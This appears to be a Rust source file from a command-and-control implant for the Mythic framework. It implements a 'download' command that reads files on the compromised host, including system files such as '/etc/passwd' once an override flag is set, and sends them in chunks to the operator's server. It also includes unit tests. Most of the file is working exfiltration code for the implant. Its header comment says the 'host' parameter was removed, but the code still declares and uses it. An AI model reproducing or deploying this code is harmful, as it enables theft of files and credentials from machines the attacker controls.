//! File download (agent -> Mythic) - multi-chunk, streaming.
//!
//! Registers the file with Mythic first, waits for the Mythic-assigned
//! `file_id`, then streams chunks using that server-side identifier.
//!
//! Memory usage: bounded to [`DEFAULT_CHUNK_SIZE`] regardless of file size —
//! safe for files larger than available RAM.
//!
//! The agent loop must post the registration response through `post_response`
//! so it can receive the response receipt containing `file_id`.
//!
//! Task parameters (JSON):
//! ```json
//! {
//!     "path": "/etc/passwd",
//!     "chunk_size": 524288   // optional, bytes (default 512 KiB)
//! }
//! ```
//!
//! Note: `host` used to be a parameter on this command. Mythic's UI
//! already tags downloads with the originating callback's host
//! server-side, so the operator never needs to supply it; we
//! removed it to stop the tasking panel from prompting for it on
//! every `download`.

use std::collections::HashMap;
use std::fs::File;
use std::io::{Read, Seek, SeekFrom};
use std::path::Path;
use std::sync::{Mutex, OnceLock};

use base64::Engine;
use mythic::{Artifact, TaskDownload, TaskMessage, TaskResponse};
use serde::Deserialize;
use uuid::Uuid;

use crate::common::pathguard::{display_path, is_protected_path, normalize_user_path};
use crate::dispatch::PostResponseReceipt;

// ── Params ──────────────────────────────────────────────────

#[derive(Deserialize)]
struct Params {
    path: String,
    /// Chunk size in bytes (default 512 KiB). Clamped to [64 KiB, 8 MiB].
    #[serde(default)]
    chunk_size: Option<u32>,
    /// When true, allow exfiltrating system paths (default false).
    #[serde(default)]
    allow_system_path: bool,
    #[serde(default)]
    host: Option<String>,
}

// ── Constants ───────────────────────────────────────────────

const DEFAULT_CHUNK_SIZE: u32 = 512 * 1024; // 512 KiB
const MIN_CHUNK_SIZE: u32 = 64 * 1024; // 64 KiB
const MAX_CHUNK_SIZE: u32 = 8 * 1024 * 1024; // 8 MiB
/// Hard ceiling on total file size to prevent runaway disk reads.
const MAX_TOTAL_SIZE: u64 = 4 * 1024 * 1024 * 1024; // 4 GiB

struct DownloadMeta {
    task_id: Uuid,
    total_chunks: u32,
    chunk_size: u32,
    filename: String,
    full_path: String,
    host: Option<String>,
    total_size: u64,
    path_str: String,
    file_id: Option<Uuid>,
    next_chunk: u32,
}

static PENDING_DOWNLOADS: OnceLock<Mutex<HashMap<Uuid, DownloadMeta>>> = OnceLock::new();

fn pending_downloads() -> &'static Mutex<HashMap<Uuid, DownloadMeta>> {
    PENDING_DOWNLOADS.get_or_init(|| Mutex::new(HashMap::new()))
}

fn pending_downloads_lock() -> std::sync::MutexGuard<'static, HashMap<Uuid, DownloadMeta>> {
    pending_downloads()
        .lock()
        .unwrap_or_else(|poisoned| poisoned.into_inner())
}

fn download_chunk_response(
    meta: &DownloadMeta,
    file_id: Uuid,
    chunk_num: u32,
    encoded: String,
    is_last: bool,
) -> TaskResponse {
    TaskResponse {
        task_id: meta.task_id,
        completed: Some(is_last),
        status: Some(if is_last {
            "completed".into()
        } else {
            "processing".into()
        }),
        user_output: if is_last {
            Some(format!(
                "{} ({} bytes, {} chunks)",
                meta.filename, meta.total_size, meta.total_chunks
            ))
        } else {
            None
        },
        download: Some(TaskDownload {
            chunk_size: Some(meta.chunk_size),
            chunk_num: Some(chunk_num),
            chunk_data: Some(encoded),
            host: meta.host.clone(),
            is_screenshot: false,
            file_id: Some(file_id),
            ..Default::default()
        }),
        ..Default::default()
    }
}

fn next_download_chunk(meta: &DownloadMeta, file_id: Uuid, chunk_num: u32) -> TaskResponse {
    if chunk_num == 0 || chunk_num > meta.total_chunks {
        return TaskResponse::failed(
            meta.task_id,
            &format!(
                "download state invalid for {}: chunk {chunk_num}/{}",
                meta.full_path, meta.total_chunks
            ),
        );
    }

    if meta.total_size == 0 {
        return download_chunk_response(meta, file_id, 1, String::new(), true);
    }

    let path = Path::new(&meta.path_str);
    let mut file = match File::open(path) {
        Ok(f) => f,
        Err(e) => {
            return TaskResponse::failed(
                meta.task_id,
                &format!(
                    "read {} failed after download registration: {e}",
                    meta.full_path
                ),
            );
        }
    };

    let offset = (chunk_num as u64 - 1) * meta.chunk_size as u64;
    if let Err(e) = file.seek(SeekFrom::Start(offset)) {
        return TaskResponse::failed(
            meta.task_id,
            &format!("seek {} to byte {offset} failed: {e}", meta.full_path),
        );
    }

    let remaining = meta.total_size.saturating_sub(offset);
    let want = remaining.min(meta.chunk_size as u64) as usize;
    let mut buf = vec![0u8; want];
    let mut filled = 0usize;
    while filled < want {
        match file.read(&mut buf[filled..want]) {
            Ok(0) => break,
            Ok(n) => filled += n,
            Err(e) => {
                return TaskResponse::failed(
                    meta.task_id,
                    &format!(
                        "read {} failed at byte {}/{}: {e}",
                        meta.full_path,
                        offset + filled as u64,
                        meta.total_size
                    ),
                );
            }
        }
    }
    if filled == 0 {
        return TaskResponse::failed(
            meta.task_id,
            &format!(
                "read {} ended before expected size at byte {offset}/{}",
                meta.full_path, meta.total_size
            ),
        );
    }

    let encoded = base64::engine::general_purpose::STANDARD.encode(&buf[..filled]);
    let is_last = chunk_num >= meta.total_chunks;
    download_chunk_response(meta, file_id, chunk_num, encoded, is_last)
}

pub fn responses_from_receipts(receipts: &[PostResponseReceipt]) -> Vec<TaskResponse> {
    let mut out = Vec::new();
    for receipt in receipts {
        let mut meta = match pending_downloads_lock().remove(&receipt.task_id) {
            Some(meta) => meta,
            None => continue,
        };

        if let Some(error) = &receipt.error {
            out.push(TaskResponse::failed(
                receipt.task_id,
                &format!("download failed: {error}"),
            ));
            continue;
        };

        if !receipt.status.is_empty() && receipt.status != "success" {
            out.push(TaskResponse::failed(
                receipt.task_id,
                &format!("download failed with status {}", receipt.status),
            ));
            continue;
        }

        if meta.file_id.is_none() {
            match receipt.file_id {
                Some(file_id) => meta.file_id = Some(file_id),
                None => {
                    out.push(TaskResponse::failed(
                        receipt.task_id,
                        "download registration did not return a Mythic file_id",
                    ));
                    continue;
                }
            }
        };

        let file_id = meta.file_id.expect("checked above");
        let chunk_num = meta.next_chunk;
        let response = next_download_chunk(&meta, file_id, chunk_num);
        let completed =
            response.completed == Some(true) || response.status.as_deref() == Some("error");
        out.push(response);
        if !completed {
            meta.next_chunk += 1;
            pending_downloads_lock().insert(meta.task_id, meta);
        }
    }
    out
}

// ── Main handler ────────────────────────────────────────────

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("download parse error: {e}")),
    };

    let path_str = normalize_user_path(&params.path);
    if !params.allow_system_path && is_protected_path(&path_str) {
        return TaskResponse::failed(
            task.id,
            &format!(
                "refusing to download system path {}; set allow_system_path=true to override",
                path_str
            ),
        );
    }

    let path = Path::new(&path_str);
    let filename = path
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| "unknown".into());
    let full_path = display_path(path);

    // 1. Open file and get total size
    let file = match File::open(path) {
        Ok(f) => f,
        Err(e) => {
            return TaskResponse::failed(
                task.id,
                &format!("read {} failed: {e}", display_path(path)),
            );
        }
    };
    let total_size = match file.metadata() {
        Ok(m) => m.len(),
        Err(e) => {
            return TaskResponse::failed(
                task.id,
                &format!("stat {} failed: {e}", display_path(path)),
            );
        }
    };
    if total_size > MAX_TOTAL_SIZE {
        return TaskResponse::failed(
            task.id,
            &format!(
                "file too large: {} bytes (max {}); use a custom stager",
                total_size, MAX_TOTAL_SIZE
            ),
        );
    }
    let host = params.host.filter(|h| !h.trim().is_empty());

    // 2. Compute chunk params
    let chunk_size = params
        .chunk_size
        .unwrap_or(DEFAULT_CHUNK_SIZE)
        .clamp(MIN_CHUNK_SIZE, MAX_CHUNK_SIZE);
    let total_chunks: u32 = if total_size == 0 {
        1
    } else {
        total_size.div_ceil(chunk_size as u64) as u32
    };
    info!(
        "[download] {} ({} bytes) -> {} chunks of {} bytes",
        full_path, total_size, total_chunks, chunk_size
    );

    let download_meta = DownloadMeta {
        task_id: task.id,
        total_chunks,
        chunk_size,
        filename: filename.clone(),
        full_path: full_path.clone(),
        host: host.clone(),
        total_size,
        path_str: path_str.clone(),
        file_id: None,
        next_chunk: 1,
    };
    pending_downloads_lock().insert(task.id, download_meta);

    // Registration response. Mythic returns the authoritative file_id in the
    // post_response receipt; chunks are generated only after that receipt.
    TaskResponse {
        task_id: task.id,
        completed: Some(false),
        status: Some("processing".into()),
        user_output: Some(format!(
            "starting download of {} ({} bytes)",
            full_path, total_size
        )),
        artifacts: vec![Artifact {
            base_artifact: "FileOpen".into(),
            artifact: full_path.clone(),
            needs_cleanup: false,
            resolved: true,
        }],
        download: Some(TaskDownload {
            total_chunks: Some(total_chunks),
            chunk_size: Some(chunk_size),
            filename: Some(filename),
            full_path: Some(full_path),
            host,
            is_screenshot: false,
            ..Default::default()
        }),
        ..Default::default()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn temp_file(name: &str) -> std::path::PathBuf {
        let mut path = std::env::temp_dir();
        path.push(format!(
            "nanaz_download_test_{}_{}",
            std::process::id(),
            name
        ));
        path
    }

    #[test]
    fn test_download_empty_file_sends_one_chunk() {
        let path = temp_file("empty.bin");
        std::fs::write(&path, b"").unwrap();
        let task = TaskMessage {
            id: Uuid::new_v4(),
            command: "download".into(),
            parameters: serde_json::json!({ "path": path.to_string_lossy() }).to_string(),
            ..Default::default()
        };

        let resp = handle(&task);
        assert_eq!(resp.status.as_deref(), Some("processing"));
        let registration = resp.download.as_ref().expect("download registration set");
        assert_eq!(registration.total_chunks, Some(1));
        assert_eq!(registration.file_id, None);

        let chunks = responses_from_receipts(&[PostResponseReceipt {
            task_id: task.id,
            status: "success".into(),
            file_id: Some(Uuid::from_u128(1)),
            error: None,
            ..Default::default()
        }]);
        assert_eq!(chunks.len(), 1);
        let chunk = chunks[0].download.as_ref().expect("download chunk set");
        assert_eq!(chunk.total_chunks, None);
        assert_eq!(chunk.chunk_num, Some(1));
        assert_eq!(chunk.chunk_data.as_deref(), Some(""));
        assert_eq!(chunks[0].completed, Some(true));

        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn test_download_pending_state_crosses_worker_threads() {
        let path = temp_file("threaded.bin");
        std::fs::write(&path, b"threaded download").unwrap();
        let task = TaskMessage {
            id: Uuid::new_v4(),
            command: "download".into(),
            parameters: serde_json::json!({ "path": path.to_string_lossy() }).to_string(),
            ..Default::default()
        };
        let task_id = task.id;

        let registration = std::thread::spawn(move || handle(&task)).join().unwrap();
        assert_eq!(registration.status.as_deref(), Some("processing"));

        let chunks = responses_from_receipts(&[PostResponseReceipt {
            task_id,
            status: "success".into(),
            file_id: Some(Uuid::new_v4()),
            error: None,
            ..Default::default()
        }]);
        assert_eq!(chunks.len(), 1);
        assert_eq!(chunks[0].completed, Some(true));
        assert_eq!(
            chunks[0]
                .download
                .as_ref()
                .and_then(|d| d.chunk_data.as_deref()),
            Some("dGhyZWFkZWQgZG93bmxvYWQ=")
        );

        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn test_download_streams_multiple_chunks_from_receipts() {
        let path = temp_file("multi.bin");
        let mut data = vec![0u8; MIN_CHUNK_SIZE as usize + 17];
        for (i, byte) in data.iter_mut().enumerate() {
            *byte = (i % 251) as u8;
        }
        std::fs::write(&path, &data).unwrap();

        let task = TaskMessage {
            id: Uuid::new_v4(),
            command: "download".into(),
            parameters: serde_json::json!({
                "path": path.to_string_lossy(),
                "chunk_size": MIN_CHUNK_SIZE,
            })
            .to_string(),
            ..Default::default()
        };
        let file_id = Uuid::from_u128(2);

        let registration = handle(&task);
        let download = registration
            .download
            .as_ref()
            .expect("download registration set");
        assert_eq!(download.total_chunks, Some(2));
        assert_eq!(download.file_id, None);

        let first = responses_from_receipts(&[PostResponseReceipt {
            task_id: task.id,
            status: "success".into(),
            file_id: Some(file_id),
            ..Default::default()
        }]);
        assert_eq!(first.len(), 1);
        assert_eq!(first[0].completed, Some(false));
        let first_download = first[0].download.as_ref().expect("first chunk set");
        assert_eq!(first_download.file_id, Some(file_id));
        assert_eq!(first_download.chunk_num, Some(1));
        assert_eq!(first_download.total_chunks, None);
        assert_eq!(first_download.filename, None);
        assert_eq!(first_download.full_path, None);

        let second = responses_from_receipts(&[PostResponseReceipt {
            task_id: task.id,
            status: "success".into(),
            file_id: Some(file_id),
            ..Default::default()
        }]);
        assert_eq!(second.len(), 1);
        assert_eq!(second[0].completed, Some(true));
        let second_download = second[0].download.as_ref().expect("second chunk set");
        assert_eq!(second_download.file_id, Some(file_id));
        assert_eq!(second_download.chunk_num, Some(2));
        assert_eq!(second_download.total_chunks, None);
        assert_eq!(second_download.filename, None);
        assert_eq!(second_download.full_path, None);

        let _ = std::fs::remove_file(path);
    }
}
